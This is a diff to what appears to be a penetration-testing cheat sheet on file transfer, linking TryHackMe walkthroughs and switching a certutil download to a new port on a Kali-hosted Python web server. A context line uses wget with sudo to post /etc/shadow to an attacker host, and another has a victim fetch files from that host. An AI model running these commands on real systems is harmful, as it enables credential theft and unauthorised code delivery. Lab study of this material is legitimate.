@@ -67,12 +67,18 @@ sudo -u root /usr/bin/wget --post-file=/etc/shadow $KALI:4444
 
 **Example**
 
-[retro.md](../walkthroughs/tryhackme/retro.md "mention")
+[retro.md](../walkthroughs/tryhackme/retro.md "mention")[relevant.md](../walkthroughs/tryhackme/relevant.md "mention")
+
+**Kali**
+
+```
+python2 -m SimpleHTTPServer 82
+```
 
 **Victim**&#x20;
 
 ```
-certutil -urlcache -f http://$KALI:81/$FILE $FILE
+certutil -urlcache -f http://$KALI:82/$FILE $FILE
 ```
 
 
